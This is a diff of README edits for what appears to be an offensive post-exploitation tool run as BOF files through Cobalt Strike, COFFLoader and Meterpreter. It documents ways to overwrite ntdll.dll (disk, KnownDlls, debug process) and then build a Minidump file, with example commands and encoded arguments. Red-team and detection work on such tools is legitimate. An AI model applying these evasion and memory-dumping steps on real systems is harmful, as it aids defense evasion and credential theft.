@@ -9,11 +9,11 @@ You can execute the files using Cobalt Strike, TrustedSec's [COFFLoader](https:/
 
 ## Cobalt Strike
 
-You can execute the BOF files after importing each aggressor script:
+First import each aggressor script:
 
 ![bof1](https://raw.githubusercontent.com/ricardojoserf/ricardojoserf.github.io/master/images/trickdump/Screenshot_BOF1.png)
 
-You can use use an argument for overwriting ntdll.dll:
+Each BOF file has one optional input argument for overwriting ntdll.dll:
 - "disk": Using a DLL already on disk. The default path is "C:\Windows\System32\ntdll.dll".    
 - "knowndlls": Using the KnownDlls folder.
 - "debugproc": Using a process created in debug mode. The default process is "c:\windows\system32\calc.exe".
@@ -47,7 +47,7 @@ python3 create_dump.py [-l LOCK_JSON] [-s SHOCK_JSON] [-b BARREL_JSON] [-d BARRE
 
 ![bof5](https://raw.githubusercontent.com/ricardojoserf/ricardojoserf.github.io/master/images/trickdump/Screenshot_BOF5.png)
 
-If you prefer to generate all the files at the same time you can run Trick instead:
+If you prefer to generate all the files at the same time you can run "trick" instead:
 
 ```
 trick <OVERWRITE_TECHNIQUE>
@@ -71,7 +71,7 @@ The argument to overwrite the ntdll library must be generated using COFFLoader's
 - "knowndlls": Use the value 0e0000000a0000006b6e6f776e646c6c7300
 - "debugproc": Use the value 0e0000000a000000646562756770726f6300
   
-Examples running each one with a differente overwrite technique:
+Examples running each BOF file with a differente overwrite technique:
 
 ```
 COFFLoader64.exe go lock_bof.o 09000000050000006469736b00
@@ -95,7 +95,7 @@ And create the Minidump file:
 
 ![img11](https://raw.githubusercontent.com/ricardojoserf/ricardojoserf.github.io/master/images/trickdump/Screenshot_BOF11.png)
 
-Or create all at the same time with Trick:
+Or create all the files at the same time with the Trick BOF and generate the Minidump later:
 
 ```
 COFFLoader64.exe go trick_bof.o <OVERWRITE_TECHNIQUE>
@@ -113,9 +113,9 @@ You can run the BOF files in your Meterpreter session after loading the execute_
 
 ```
 load bofloader
-execute_bof lock_bof.o <OVERWRITE_TECHNIQUE>
-execute_bof shock_bof.o <OVERWRITE_TECHNIQUE>
-execute_bof barrel_bof.o <OVERWRITE_TECHNIQUE>
+execute_bof lock_bof.o --format-string z <OVERWRITE_TECHNIQUE>
+execute_bof shock_bof.o --format-string z <OVERWRITE_TECHNIQUE>
+execute_bof barrel_bof.o --format-string z <OVERWRITE_TECHNIQUE>
 ```
 
 ![img14](https://raw.githubusercontent.com/ricardojoserf/ricardojoserf.github.io/master/images/trickdump/Screenshot_BOF14.png)
@@ -124,10 +124,10 @@ Then create the Minidump file:
 
 ![img15](https://raw.githubusercontent.com/ricardojoserf/ricardojoserf.github.io/master/images/trickdump/Screenshot_BOF15.png)
 
-The same happens with the Trick BOF:
+Or create all the files at the same time with the Trick BOF and generate the Minidump later:
 
 ```
-execute_bof trick_bof.o <OVERWRITE_TECHNIQUE>
+execute_bof trick_bof.o --format-string z <OVERWRITE_TECHNIQUE>
 ```
 
 ![img16](https://raw.githubusercontent.com/ricardojoserf/ricardojoserf.github.io/master/images/trickdump/Screenshot_BOF16.png)
